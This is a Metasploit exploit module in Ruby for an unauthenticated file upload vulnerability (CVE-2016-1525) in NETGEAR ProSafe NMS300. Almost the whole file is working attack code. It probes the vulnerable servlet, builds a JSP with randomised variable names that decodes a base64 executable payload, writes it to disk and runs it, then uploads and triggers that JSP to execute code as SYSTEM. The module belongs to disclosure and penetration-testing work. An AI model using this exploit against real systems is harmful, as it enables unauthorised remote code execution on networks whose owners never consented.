##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require \'msf/core\'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      \'Name\'        => \'NETGEAR ProSafe Network Management System 300 Arbitrary File Upload\',
      \'Description\' => %q{
        Netgear\'s ProSafe NMS300 is a network management utility that runs on Windows systems.
        The application has a file upload vulnerability that can be exploited by an
        unauthenticated remote attacker to execute code as the SYSTEM user.
        Two servlets are vulnerable, FileUploadController (located at
        /lib-1.0/external/flash/fileUpload.do) and FileUpload2Controller (located at /fileUpload.do).
        This module exploits the latter, and has been tested with versions 1.5.0.2, 1.4.0.17 and
        1.1.0.13.
      },
      \'Author\' =>
        [
          \'Pedro Ribeiro <pedrib[at]gmail.com>\' # Vulnerability discovery and updated MSF module
        ],
      \'License\' => MSF_LICENSE,
      \'References\' =>
        [
          [\'CVE\', \'2016-1525\'],
          [\'US-CERT-VU\', \'777024\'],
          [\'URL\', \'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt\'],
          [\'URL\', \'http://seclists.org/fulldisclosure/2016/Feb/30\']
        ],
      \'DefaultOptions\' => { \'WfsDelay\' => 5 },
      \'Platform\' => \'win\',
      \'Arch\' => ARCH_X86,
      \'Privileged\' => true,
      \'Targets\' =>
        [
          [ \'NETGEAR ProSafe Network Management System 300 / Windows\', {} ]
        ],
      \'DefaultTarget\' => 0,
      \'DisclosureDate\' => \'Feb 4 2016\'))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(\'TARGETURI\', [true,  \"Application path\", \'/\'])
      ], self.class)
  end


  def check
    res = send_request_cgi({
      \'uri\'    => normalize_uri(datastore[\'TARGETURI\'], \'fileUpload.do\'),
      \'method\' => \'GET\'
    })
    if res && res.code == 405
      Exploit::CheckCode::Detected
    else
      Exploit::CheckCode::Safe
    end
  end


  def generate_jsp_payload
    exe = generate_payload_exe
    base64_exe = Rex::Text.encode_base64(exe)
    payload_name = rand_text_alpha(rand(6)+3)

    var_raw     = \'a\' + rand_text_alpha(rand(8) + 3)
    var_ostream = \'b\' + rand_text_alpha(rand(8) + 3)
    var_buf     = \'c\' + rand_text_alpha(rand(8) + 3)
    var_decoder = \'d\' + rand_text_alpha(rand(8) + 3)
    var_tmp     = \'e\' + rand_text_alpha(rand(8) + 3)
    var_path    = \'f\' + rand_text_alpha(rand(8) + 3)
    var_proc2   = \'e\' + rand_text_alpha(rand(8) + 3)

    jsp = %Q|
    <%@page import=\"java.io.*\"%>
    <%@page import=\"sun.misc.BASE64Decoder\"%>
    <%
    try {
      String #{var_buf} = \"#{base64_exe}\";
      BASE64Decoder #{var_decoder} = new BASE64Decoder();
      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());

      File #{var_tmp} = File.createTempFile(\"#{payload_name}\", \".exe\");
      String #{var_path} = #{var_tmp}.getAbsolutePath();

      BufferedOutputStream #{var_ostream} =
        new BufferedOutputStream(new FileOutputStream(#{var_path}));
      #{var_ostream}.write(#{var_raw});
      #{var_ostream}.close();
      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});
    } catch (Exception e) {
    }
    %>
    |

    jsp.gsub!(/[\\n\\t\\r]/, \'\')

    return jsp
  end


  def exploit
    jsp_payload = generate_jsp_payload

    jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
    jsp_full_name = \"null#{jsp_name}.jsp\"
    post_data = Rex::MIME::Message.new
    post_data.add_part(jsp_name, nil, nil, \'form-data; name=\"name\"\')
    post_data.add_part(jsp_payload,
      \"application/octet-stream\", \'binary\',
      \"form-data; name=\\\"Filedata\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(6+rand(10))}.jsp\\\"\")
    data = post_data.to_s

    print_status(\"#{peer} - Uploading payload...\")
    res = send_request_cgi({
      \'uri\'    => normalize_uri(datastore[\'TARGETURI\'], \'fileUpload.do\'),
      \'method\' => \'POST\',
      \'data\'   => data,
      \'ctype\'  => \"multipart/form-data; boundary=#{post_data.bound}\"
    })
    if res && res.code == 200 && res.body.to_s =~ /{\"success\":true, \"file\":\"#{jsp_name}.jsp\"}/
      print_status(\"#{peer} - Payload uploaded successfully\")
    else
      fail_with(Failure::Unknown, \"#{peer} - Payload upload failed\")
    end

    print_status(\"#{peer} - Executing payload...\")
    send_request_cgi({
      \'uri\'    => normalize_uri(datastore[\'TARGETURI\'], jsp_full_name),
      \'method\' => \'GET\'
    })
    handler
  end
end